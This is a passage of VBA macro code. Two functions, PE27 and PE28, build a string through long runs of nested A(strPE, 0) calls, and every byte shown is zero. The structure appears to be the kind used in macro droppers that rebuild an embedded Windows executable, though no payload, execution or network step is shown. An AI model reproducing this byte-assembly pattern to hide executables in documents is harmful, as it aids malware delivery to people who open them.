    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE27 = strPE
End Function

Private Function PE28() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
